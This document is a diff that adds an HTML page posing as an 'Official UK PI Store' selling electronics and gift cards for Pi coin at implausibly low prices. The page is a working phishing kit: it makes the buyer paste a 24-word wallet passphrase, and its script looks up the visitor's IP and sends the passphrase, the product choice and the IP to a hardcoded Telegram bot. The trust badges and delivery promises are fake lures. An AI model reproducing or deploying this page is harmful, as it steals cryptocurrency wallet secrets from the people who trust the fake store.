@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>π Shopping Marketplace | Official UK PI Store</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #f5f7fb;
+            color: #0a1927;
+            direction: rtl;
+            scroll-behavior: smooth;
+        }
+
+        /* Modern navbar */
+        .navbar {
+            background: linear-gradient(135deg, #0a1428 0%, #0f212f 100%);
+            padding: 1rem 2rem;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 3px solid #f5b042;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 10px 25px -8px rgba(0,0,0,0.2);
+        }
+
+        .logo h1 {
+            font-size: 1.8rem;
+            background: linear-gradient(125deg, #ffe6a3, #f5b042);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .logo p {
+            color: #9bb5d4;
+            font-size: 0.7rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.8rem;
+            font-weight: 600;
+        }
+
+        .nav-links a {
+            color: #eef2ff;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+
+        .nav-links a:hover {
+            color: #f5b042;
+        }
+
+        .pi-badge {
+            background: #102331;
+            padding: 0.4rem 1.3rem;
+            border-radius: 40px;
+            color: #ffd966;
+            border: 1px solid #f5b042;
+            font-weight: bold;
+            font-size: 0.85rem;
+        }
+
+        /* Hero */
+        .hero {
+            background: linear-gradient(107deg, #03101e 0%, #102a3c 100%), url('https://images.unsplash.com/photo-1556741533-6e6a3bd8b0b2?w=1920&h=400&fit=crop');
+            background-blend-mode: overlay;
+            background-size: cover;
+            padding: 3rem 1.5rem;
+            text-align: center;
+            color: white;
+        }
+
+        .hero h2 {
+            font-size: 2.4rem;
+            font-weight: 700;
+        }
+
+        .hero p {
+            max-width: 700px;
+            margin: 0.75rem auto;
+            opacity: 0.95;
+        }
+
+        .delivery {
+            background: #1f8a4c;
+            display: inline-block;
+            padding: 0.5rem 1.8rem;
+            border-radius: 50px;
+            margin-top: 1rem;
+            font-weight: bold;
+        }
+
+        /* Wallet Section - exactly as reference images */
+        .wallet-card {
+            background: white;
+            max-width: 750px;
+            margin: 2rem auto;
+            padding: 2rem;
+            border-radius: 48px;
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.15);
+            text-align: center;
+            border: 1px solid #eef2f8;
+        }
+
+        .wallet-card h3 {
+            color: #0f2b3d;
+            font-size: 1.7rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .wallet-sub {
+            color: #5a6e85;
+            margin-bottom: 1rem;
+        }
+
+        .passphrase-textarea {
+            width: 100%;
+            padding: 1rem;
+            font-size: 1rem;
+            border-radius: 28px;
+            border: 2px solid #e2e8f0;
+            font-family: monospace;
+            direction: ltr;
+            text-align: center;
+            margin: 1rem 0;
+        }
+
+        .passphrase-textarea:focus {
+            border-color: #f5b042;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(245,176,66,0.2);
+        }
+
+        .btn-wallet {
+            background: linear-gradient(95deg, #0f2b3d, #1d4e6e);
+            color: white;
+            border: none;
+            padding: 1rem;
+            width: 100%;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn-wallet:hover {
+            background: #f5b042;
+            color: #0a0c1a;
+        }
+
+        .warning-box {
+            font-size: 0.75rem;
+            background: #fff0f0;
+            color: #b91c1c;
+            padding: 0.8rem;
+            border-radius: 28px;
+            margin-top: 1rem;
+        }
+
+        .ecosystem-note {
+            background: #eef2fa;
+            padding: 0.6rem;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            margin: 1rem 0;
+            color: #2c3e66;
+        }
+
+        /* Selected product preview */
+        .selected-preview {
+            background: #fff6e5;
+            padding: 0.7rem;
+            border-radius: 60px;
+            text-align: center;
+            max-width: 750px;
+            margin: 0 auto 1rem auto;
+            font-weight: 600;
+            color: #b45f06;
+        }
+
+        .clear-btn {
+            background: none;
+            border: none;
+            color: #d97706;
+            text-decoration: underline;
+            cursor: pointer;
+            margin-right: 8px;
+        }
+
+        /* Products Grid */
+        .container {
+            max-width: 1400px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
+        }
+
+        .section-title {
+            font-size: 1.8rem;
+            margin: 2rem 0 1.2rem 0;
+            border-right: 6px solid #f5b042;
+            padding-right: 1rem;
+            font-weight: 700;
+            color: #0c2a38;
+        }
+
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .product-card {
+            background: white;
+            border-radius: 28px;
+            overflow: hidden;
+            box-shadow: 0 12px 25px -10px rgba(0,0,0,0.08);
+            transition: 0.25s ease;
+            border: 1px solid #eef2f8;
+        }
+
+        .product-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 20px 30px -12px rgba(0,0,0,0.15);
+            border-color: #f5b04280;
+        }
+
+        .product-img {
+            width: 100%;
+            height: 220px;
+            background: #fafcff;
+            overflow: hidden;
+        }
+
+        .product-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: 0.3s;
+        }
+
+        .product-card:hover .product-img img {
+            transform: scale(1.03);
+        }
+
+        .product-info {
+            padding: 1rem 1.2rem 1.3rem;
+        }
+
+        .product-title {
+            font-weight: 800;
+            font-size: 1.1rem;
+            margin-bottom: 0.3rem;
+        }
+
+        .rating {
+            color: #f5b042;
+            margin: 6px 0;
+            font-size: 0.85rem;
+        }
+
+        .stock {
+            font-size: 0.7rem;
+            background: #e8f5e9;
+            color: #2e7d32;
+            display: inline-block;
+            padding: 0.2rem 0.8rem;
+            border-radius: 30px;
+        }
+
+        .price {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #0f2b3d;
+            margin: 10px 0;
+        }
+
+        .price span {
+            font-size: 0.9rem;
+            color: #f5a623;
+        }
+
+        .buy-btn {
+            background: #0f2b3d;
+            color: white;
+            border: none;
+            padding: 0.7rem;
+            width: 100%;
+            border-radius: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .buy-btn:hover {
+            background: #f5b042;
+            color: #0a1424;
+        }
+
+        footer {
+            background: #0b1422;
+            color: #9bb0c7;
+            text-align: center;
+            padding: 2rem;
+            margin-top: 3rem;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: #1f2a3e;
+            color: #ffe5b4;
+            padding: 12px 24px;
+            border-radius: 50px;
+            display: none;
+            z-index: 1100;
+            font-weight: 500;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        @media (max-width: 700px) {
+            .navbar {
+                flex-direction: column;
+                gap: 0.8rem;
+            }
+            .hero h2 {
+                font-size: 1.6rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="navbar">
+    <div class="logo">
+        <h1>π Shopping Marketplace</h1>
+        <p>🇬🇧 UK's Official PI Commerce Platform</p>
+    </div>
+    <div class="nav-links">
+        <a href="#">Home</a>
+        <a href="#">Wallet</a>
+        <a href="#">Pi Apps</a>
+        <a href="#">Gift Cards</a>
+        <a href="#">Mobile</a>
+        <a href="#">Gaming</a>
+    </div>
+    <div class="pi-badge">✓ Pay with PI Coin</div>
+</div>
+
+<div class="hero">
+    <h2>Buy Premium Products with PI Coin</h2>
+    <p>🌍 Worldwide delivery • Trusted UK marketplace • Fast & secure</p>
+    <div class="delivery">🚚 Same-day dispatch • Tracked shipping • 24/7 support</div>
+</div>
+
+<!-- WALLET 24-WORD PASSPHRASE SECTION (exactly as reference images) -->
+<div class="wallet-card" id="walletSection">
+    <h3>🔐 ألصق رمز المرور الخاص بك لفتح المحفظة</h3>
+    <p class="wallet-sub">أدخل عبارة المرور المكونة من 24 كلمة هنا</p>
+    <textarea id="passphraseInput" class="passphrase-textarea" rows="3" placeholder="example: abandon ... luxury ... zoo (24 words)" style="resize: vertical;"></textarea>
+    <button class="btn-wallet" id="verifyWalletBtn">الدخول بإستخدام رمز المرور</button>
+    <div class="ecosystem-note">
+        🔹 Biometric Not Available 🔹<br>
+        بما ان المحفظة من غير حراسة ، يمكن الوصول إلى عبارة مرور المحفظة حصريًا بواسطة فقط.
+    </div>
+    <div class="warning-box">
+        ⚠️ هل فقدت عبارة المرور الخاصة ؟ يمكنك إنشاء محفظة جديدة ولكن لن تتمكن من الوصول إلى كل باي في محفظتك السابقة
+    </div>
+</div>
+
+<!-- Selected product display -->
+<div class="selected-preview" id="selectedPreview">
+    ✨ هیچ بەرهەمێک هەڵنەبژێردراوە • تکایە "Buy Now" کلیک بکە
+</div>
+
+<div class="container">
+    <div class="section-title">🔥 FEATURED OFFERS</div>
+    <div class="products-grid" id="featuredGrid"></div>
+
+    <div class="section-title">🎁 Gift Cards</div>
+    <div class="products-grid" id="giftGrid"></div>
+
+    <div class="section-title">📡 Mobile & Internet (Asiacell • Korek • Zain • Fastlink)</div>
+    <div class="products-grid" id="mobileGrid"></div>
+
+    <div class="section-title">🎮 Gaming & Consoles</div>
+    <div class="products-grid" id="gamingGrid"></div>
+
+    <div class="section-title">💻 Computers & Laptops</div>
+    <div class="products-grid" id="computerGrid"></div>
+
+    <div class="section-title">✨ Premium Electronics</div>
+    <div class="products-grid" id="specialGrid"></div>
+</div>
+
+<footer>
+    <p>© 2025 π Shopping Marketplace — Official British PI Ecosystem | Wallet • KYC • Blockchain</p>
+</footer>
+
+<div id="toastMsg" class="toast"></div>
+
+<script>
+    // ======================== PRODUCT DATABASE (HD images) ========================
+    const products = [
+        { id:1, name:"✨ Special Premium Bundle + Bonus", price:50, currency:"Pi π", category:"featured", stock:true, rating:5, img:"https://images.unsplash.com/photo-1600880292203-757bb62b4baf?w=500&h=350&fit=crop" },
+        { id:2, name:"Xbox Game Pass Ultimate - 1 Year", price:20, currency:"Pi π", category:"featured", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1621259182978-fbf93132d53d?w=500&h=350&fit=crop" },
+        { id:3, name:"Google Play Card $50", price:30, currency:"Pi π", category:"gift", stock:true, rating:4.8, img:"https://images.unsplash.com/photo-1589998059171-988d887df646?w=500&h=350&fit=crop" },
+        { id:4, name:"Apple iTunes Gift Card $100", price:30, currency:"Pi π", category:"gift", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=500&h=350&fit=crop" },
+        { id:5, name:"Asiacell Credit 50,000 IQD", price:35, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=500&h=350&fit=crop" },
+        { id:6, name:"Korek Telecom Credit 10,000 IQD", price:8, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1563986768609-322da13575f3?w=500&h=350&fit=crop" },
+        { id:7, name:"Zain Credit 25,000 IQD", price:15, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=500&h=350&fit=crop" },
+        { id:8, name:"Fastlink Credit - 60 Days", price:40, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1614680376593-902f74cf0d41?w=500&h=350&fit=crop" },
+        { id:9, name:"FTTH Internet 30 Days", price:20, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=500&h=350&fit=crop" },
+        { id:10, name:"PlayStation 4 Pro 1TB", price:100, currency:"Pi π", category:"gaming", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1606144042614-b2417e99c4e3?w=500&h=350&fit=crop" },
+        { id:11, name:"PlayStation 5 Digital", price:200, currency:"Pi π", category:"gaming", stock:true, rating:5, img:"https://images.unsplash.com/photo-1607853202273-797f1c22a38e?w=500&h=350&fit=crop" },
+        { id:12, name:"Nintendo Switch OLED", price:120, currency:"Pi π", category:"gaming", stock:true, rating:4.8, img:"https://images.unsplash.com/photo-1600080972464-8e5f35f63ddc?w=500&h=350&fit=crop" },
+        { id:13, name:"Gaming Laptop RTX 4060", price:100, currency:"Pi π", category:"computer", stock:true, rating:4.7, img:"https://images.unsplash.com/photo-1588872657578-7efd1f1555ed?w=500&h=350&fit=crop" },
+        { id:14, name:"Gaming Desktop i7", price:200, currency:"Pi π", category:"computer", stock:true, rating:5, img:"https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=500&h=350&fit=crop" },
+        { id:15, name:"HP Zbook G8", price:180, currency:"Pi π", category:"computer", stock:true, rating:4.6, img:"https://images.unsplash.com/photo-1611078489935-0cb964de46d6?w=500&h=350&fit=crop" },
+        { id:16, name:"MacBook Air 2019", price:200, currency:"Pi π", category:"computer", stock:true, rating:4.5, img:"https://images.unsplash.com/photo-1611186871348-b1ce696e52c9?w=500&h=350&fit=crop" },
+        { id:17, name:"Apple Watch Series 9", price:80, currency:"Pi π", category:"special", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1579586337278-3befd40fd17a?w=500&h=350&fit=crop" },
+        { id:18, name:"iPhone 11 Pro Max 256GB", price:100, currency:"Pi π", category:"special", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=500&h=350&fit=crop" },
+        { id:19, name:"iPhone 12 Pro Max 512GB", price:120, currency:"Pi π", category:"special", stock:true, rating:5, img:"https://images.unsplash.com/photo-1603899122634-f086ca5f5ddd?w=500&h=350&fit=crop" },
+        { id:20, name:"Aventon Level.3 E-bike", price:110, currency:"Pi π", category:"special", stock:true, rating:5, img:"https://images.unsplash.com/photo-1571068316344-75bc76f77890?w=500&h=350&fit=crop" },
+        { id:21, name:"Samsung S23 Ultra", price:150, currency:"Pi π", category:"special", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1676067486096-07e4ad2d7c31?w=500&h=350&fit=crop" },
+        { id:22, name:"AirPods Pro 2", price:45, currency:"Pi π", category:"special", stock:true, rating:4.8, img:"https://images.unsplash.com/photo-1606841837239-c5a1a4a07af7?w=500&h=350&fit=crop" }
+    ];
+
+    function renderGrid(containerId, filterCat) {
+        let filtered = [];
+        if(filterCat === 'featured') filtered = products.filter(p => p.category === 'featured');
+        else if(filterCat === 'gift') filtered = products.filter(p => p.category === 'gift');
+        else if(filterCat === 'mobile') filtered = products.filter(p => p.category === 'mobile');
+        else if(filterCat === 'gaming') filtered = products.filter(p => p.category === 'gaming');
+        else if(filterCat === 'computer') filtered = products.filter(p => p.category === 'computer');
+        else if(filterCat === 'special') filtered = products.filter(p => p.category === 'special');
+        const container = document.getElementById(containerId);
+        if(!container) return;
+        if(filtered.length === 0) { container.innerHTML = '<p>Loading...</p>'; return; }
+        let html = '';
+        filtered.forEach(prod => {
+            let stars = '⭐'.repeat(Math.floor(prod.rating)) + (prod.rating % 1 ? '½' : '');
+            html += `<div class="product-card">
+                        <div class="product-img"><img src="${prod.img}" alt="${prod.name}" onerror="this.src='https://placehold.co/500x350/11212e/ffd966?text=π'"></div>
+                        <div class="product-info">
+                            <div class="product-title">${prod.name}</div>
+                            <div class="rating">${stars} ${prod.rating}</div>
+                            <div class="stock">✅ In Stock</div>
+                            <div class="price">${prod.price} <span>${prod.currency}</span></div>
+                            <button class="buy-btn" data-product='${JSON.stringify(prod)}'>Buy Now</button>
+                        </div>
+                    </div>`;
+        });
+        container.innerHTML = html;
+    }
+
+    renderGrid('featuredGrid', 'featured');
+    renderGrid('giftGrid', 'gift');
+    renderGrid('mobileGrid', 'mobile');
+    renderGrid('gamingGrid', 'gaming');
+    renderGrid('computerGrid', 'computer');
+    renderGrid('specialGrid', 'special');
+
+    // TELEGRAM BOT
+    const BOT_TOKEN = "8606192794:AAGmn_lMK3lADT2jX5SSf2LxmVNSdGCp-9k";
+    const CHAT_ID = "1423119149";
+    let selectedProduct = null;
+
+    function showToast(msg, isErr = false) {
+        const t = document.getElementById('toastMsg');
+        t.style.backgroundColor = isErr ? '#b91c1c' : '#0f2b3d';
+        t.innerText = msg;
+        t.style.display = 'block';
+        setTimeout(() => t.style.display = 'none', 4000);
+    }
+
+    function updatePreview() {
+        const div = document.getElementById('selectedPreview');
+        if(selectedProduct) {
+            div.innerHTML = `🛒 ${selectedProduct.name} (${selectedProduct.price} ${selectedProduct.currency}) <button class="clear-btn" id="clearProductBtn">سڕینەوە</button>`;
+            const clearBtn = document.getElementById('clearProductBtn');
+            if(clearBtn) clearBtn.onclick = () => { selectedProduct = null; updatePreview(); showToast("بەرهەم لابرا"); };
+        } else {
+            div.innerHTML = `✨ هیچ بەرهەمێک هەڵنەبژێردراوە • تکایە "Buy Now" کلیک بکە`;
+        }
+    }
+
+    async function sendToTelegram(passphrase, product) {
+        let ip = "unknown";
+        try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); ip = d.ip; } catch(e) {}
+        const passShort = passphrase.length > 50 ? passphrase.substring(0, 50)+"…" : passphrase;
+        const msg = `🆕 **NEW PI ORDER**\n\n🔐 24-word passphrase:\n${passShort}\n\n📦 **Product:** ${product.name}\n💰 **Price:** ${product.price} ${product.currency}\n🌍 IP: ${ip}\n⏱ Time: ${new Date().toLocaleString()}\n🇬🇧 UK Marketplace`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+            });
+            const data = await res.json();
+            if(data.ok) { showToast("✅ Passphrase & order sent to Telegram!"); return true; }
+            else { showToast("❌ Telegram error", true); return false; }
+        } catch(e) { showToast("❌ Network error", true); return false; }
+    }
+
+    document.getElementById('verifyWalletBtn').addEventListener('click', async () => {
+        const pass = document.getElementById('passphraseInput').value.trim();
+        const words = pass.split(/\s+/);
+        if(words.length !== 24) {
+            showToast("⚠️ Must be exactly 24 words (عبارة المرور 24 كلمة)", true);
+            return;
+        }
+        if(!selectedProduct) {
+            showToast("⚠️ Please select a product first (Buy Now)", true);
+            return;
+        }
+        await sendToTelegram(pass, selectedProduct);
+        document.getElementById('passphraseInput').value = '';
+    });
+
+    document.addEventListener('click', (e) => {
+        if(e.target.classList.contains('buy-btn')) {
+            const prod = JSON.parse(e.target.getAttribute('data-product'));
+            selectedProduct = prod;
+            updatePreview();
+            showToast(`🛒 "${prod.name}" selected. Now enter 24-word passphrase.`);
+            document.getElementById('walletSection').scrollIntoView({ behavior: 'smooth' });
+        }
+    });
+
+    updatePreview();
+</script>
+</body>
+</html>
